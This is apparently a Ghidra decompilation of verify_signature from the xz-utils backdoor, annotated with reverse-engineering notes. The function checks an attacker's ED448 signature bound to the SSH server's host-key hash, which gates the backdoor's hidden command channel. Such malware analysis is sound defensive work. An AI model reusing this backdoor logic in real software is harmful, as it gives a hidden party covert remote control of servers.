// /home/kali/xzre-ghidra/xzregh/107630_verify_signature.c
// Function: verify_signature @ 0x107630
// Calling convention: __stdcall
// Prototype: BOOL __stdcall verify_signature(sshkey * sshkey, u8 * signed_data, u64 sshkey_digest_offset, u64 signed_data_size, u8 * signature, u8 * ed448_raw_key, global_context_t * global_ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Checks if @p signed_data is signed with @p ed448_raw_key.
 *
 *   in order to do this, the code will
 *   - compute a sha256 hash of the SSH host key in @p sshkey (after serialization) and write it to @p signed_data at offset @p sshkey_digest_offset
 *   - load the ED448 key from @p ed448_raw_key
 *   - use it to verify @p signed_data (including the hashed SSH host key)
 *
 *   @param sshkey the SSH host key
 *   @param signed_data data to verify, including an empty space to hold the hashed SSH key
 *   @param sshkey_digest_offset offset to write the hashed SSH key to, in @p signed_data
 *   @param signed_data_size length of the @p signed_data buffer, including the space for the SSH key hash digest
 *   @param signature signature of the signed data to check
 *   @param ed448_raw_key the ED448 public key obtained from @ref secret_data_get_decrypted
 *   @param global_ctx
 *   @return BOOL TRUE if the signature verification is successful, FALSE otherwise
 */

BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u64 signed_data_size,
                     u8 *signature,u8 *ed448_raw_key,global_context_t *global_ctx)

{
  ulong tbslen;
  imported_funcs_t *piVar1;
  EC_KEY *key;
  u8 *puVar2;
  int iVar3;
  uint uVar4;
  BOOL BVar5;
  EC_POINT *p;
  EC_GROUP *group;
  size_t sVar6;
  EVP_PKEY *pkey;
  EVP_MD_CTX *ctx;
  long lVar7;
  size_t sVar8;
  undefined4 *puVar9;
  undefined8 local_c1;
  undefined8 uStack_b9;
  undefined4 local_b1 [32];
  
  if (sshkey == (sshkey *)0x0) {
    return 0;
  }
  if (signed_data == (u8 *)0x0) {
    return 0;
  }
  if (signed_data_size == 0) {
    return 0;
  }
  if (0xffffffffffffffde < sshkey_digest_offset) {
    return 0;
  }
  tbslen = sshkey_digest_offset + 0x20;
  if (global_ctx == (global_context_t *)0x0) {
    return 0;
  }
  if (signed_data_size < tbslen) {
    return 0;
  }
  piVar1 = global_ctx->imported_funcs;
  if (piVar1 == (imported_funcs_t *)0x0) {
    return 0;
  }
  iVar3 = sshkey->type;
  if (iVar3 == 2) {
    key = sshkey->ecdsa;
    local_c1 = 0;
    uStack_b9 = 0;
    puVar9 = local_b1;
    for (lVar7 = 0x79; lVar7 != 0; lVar7 = lVar7 + -1) {
      *(bool *)puVar9 = signed_data_size < tbslen;
      puVar9 = (undefined4 *)((long)puVar9 + 1);
    }
    if (key == (EC_KEY *)0x0) {
      return 0;
    }
    if (piVar1->EC_KEY_get0_public_key == (_func_36 *)0x0) {
      return 0;
    }
    if (piVar1->EC_KEY_get0_group == (_func_37 *)0x0) {
      return 0;
    }
    if (piVar1->EC_POINT_point2oct == (_func_35 *)0x0) {
      return 0;
    }
    p = (*piVar1->EC_KEY_get0_public_key)(key);
    group = (*piVar1->EC_KEY_get0_group)(key);
    sVar8 = (*piVar1->EC_POINT_point2oct)(group,p,4,(uchar *)0x0,0,(BN_CTX *)0x0);
    if (0x85 < sVar8) {
      return 0;
    }
    uVar4 = (uint)sVar8;
    local_c1 = CONCAT44(local_c1._4_4_,
                        uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 |
                        uVar4 << 0x18);
    sVar6 = (*piVar1->EC_POINT_point2oct)
                      (group,p,4,(uchar *)((long)&local_c1 + 4),sVar8,(BN_CTX *)0x0);
    if (sVar8 != sVar6) {
      return 0;
    }
    sVar8 = sVar8 + 4;
  }
  else {
    if (iVar3 < 3) {
      if (iVar3 == 0) {
        iVar3 = rsa_key_hash(sshkey->rsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,piVar1);
      }
      else {
        if (iVar3 != 1) {
          return 0;
        }
        iVar3 = dsa_key_hash(sshkey->dsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,global_ctx);
      }
      goto LAB_001076f8;
    }
    if (iVar3 != 3) {
      return 0;
    }
    puVar2 = sshkey->ed25519_pk;
    uStack_b9 = 0;
    puVar9 = local_b1;
    for (lVar7 = 5; lVar7 != 0; lVar7 = lVar7 + -1) {
      *puVar9 = 0;
      puVar9 = puVar9 + 1;
    }
    if (puVar2 == (u8 *)0x0) {
      return 0;
    }
    local_c1 = 0x20000000;
    lVar7 = 0;
    do {
      *(u8 *)((long)&local_c1 + lVar7 + 4) = puVar2[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 0x20);
    sVar8 = 0x24;
  }
  iVar3 = sha256(&local_c1,sVar8,signed_data + sshkey_digest_offset,
                 signed_data_size - sshkey_digest_offset,piVar1);
LAB_001076f8:
  if ((((iVar3 != 0) && (piVar1 = global_ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)) &&
      (BVar5 = contains_null_pointers(&piVar1->EVP_PKEY_new_raw_public_key,6), BVar5 == 0)) &&
     ((ed448_raw_key != (u8 *)0x0 &&
      (pkey = (*piVar1->EVP_PKEY_new_raw_public_key)(0x440,(ENGINE *)0x0,ed448_raw_key,0x39),
      pkey != (EVP_PKEY *)0x0)))) {
    ctx = (*piVar1->EVP_MD_CTX_new)();
    if (ctx != (EVP_MD_CTX *)0x0) {
      iVar3 = (*piVar1->EVP_DigestVerifyInit)
                        (ctx,(EVP_PKEY_CTX **)0x0,(EVP_MD *)0x0,(ENGINE *)0x0,pkey);
      if ((iVar3 == 1) &&
         (iVar3 = (*piVar1->EVP_DigestVerify)(ctx,signature,0x72,signed_data,tbslen), iVar3 == 1)) {
        (*piVar1->EVP_MD_CTX_free)(ctx);
        (*piVar1->EVP_PKEY_free)(pkey);
        return 1;
      }
      (*piVar1->EVP_MD_CTX_free)(ctx);
    }
    (*piVar1->EVP_PKEY_free)(pkey);
  }
  return 0;
}

